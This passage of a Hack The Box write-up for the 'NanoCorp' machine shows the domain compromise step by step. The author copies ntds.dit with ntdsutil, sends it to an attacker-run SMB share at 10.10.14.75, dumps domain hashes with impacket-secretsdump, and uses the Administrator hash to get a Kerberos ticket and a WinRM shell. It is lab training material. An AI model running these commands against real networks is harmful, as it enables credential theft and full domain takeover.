-a----        11/12/2025  10:21 AM       19922944 SYSTEM                                                               


    Directory: C:\Windows\NTDS


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----        11/28/2025   9:52 AM       16777216 ntds.dit 

# Safe Copies

ntdsutil "activate instance ntds" ifm "create full C:\IFM" quit quit

# From Kali
─$ sudo nano /etc/samba/smb.conf
# Add EOF

[share]
   path = /tmp/share
   browseable = yes
   writable = yes
   guest ok = yes
   read only = no

─$ sudo systemctl restart smbd
─$ sudo chmod 777 /tmp/share  
# Check
$ smbclient -L localhost -U%

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        share           Disk      
        IPC$            IPC       IPC Service (Samba 4.23.3-Debian-4.23.3+dfsg-1+b1)
        nobody          Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server localhost (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

# From monitoring_svc

PS C:\IFM> Compress-Archive -Path "C:\IFM" -DestinationPath "C:\Users\monitoring_svc\IFM.zip"

PS C:\Users\monitoring_svc> net use Z: \\10.10.14.75\share /persistent:no
 
The command completed successfully.

PS C:\Users\monitoring_svc> Copy-Item C:\Users\monitoring_svc\IFM.zip \\10.10.14.75\share\IFM.zip
```

`unzip` it on your system.
### Cracking

Use `Impacket` function to crack the hashes:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/NanoCorp/root/IFM]
└─$ impacket-secretsdump -ntds Active\ Directory/ntds.dit  -system registry/SYSTEM local 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x02832230a6146258f71e2615506bf7c4
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: b7acda5517db0d4431c8b5e930d2f2d7
[*] Reading and decrypting hashes from Active Directory/ntds.dit 
Administrator:500:aad3b435<SNIP>
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3<SNIP>
krbtgt:502:aad3b435<SNIP>
nanocorp.htb\web_svc:1103:aad3b43<SNIP>
[*] Cleaning up... 
```

Request a ticket with the `Administrator` hash (or crack it) then use [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md) with `-k` flag:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/NanoCorp/root]
└─$ impacket-getTGT nanocorp.htb/administrator:541f4c0063c<SNIP> -hashes :<SNIP> -dc-ip 10.10.11.93
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in administrator.ccache

└─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/NanoCorp/root/administrator.ccache

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/NanoCorp/root]
└─$ python3 ../user/winrmexec/evil_winrmexec.py -k -no-pass dc01.nanocorp.htb -p 5986 -url https://dc01.nanocorp.htb:5986/wsman

[*] using domain and username from ccache: NANOCORP.HTB\administrator
[*] '-spn' not specified, using HTTP/dc01.nanocorp.htb@NANOCORP.HTB
[*] '-dc-ip' not specified, using NANOCORP.HTB
[*] requesting TGS for HTTP/dc01.nanocorp.htb@NANOCORP.HTB

PS C:\Users\monitoring_svc\Desktop> cat user.txt
  HTB{{REDACTED_FLAG}}

PS C:\Users\Administrator\Desktop> cat root.txt
  HTB{{REDACTED_FLAG}}
```

**Totally Pwned the machine now !! **

The intended privesc path was really interesting and realistic.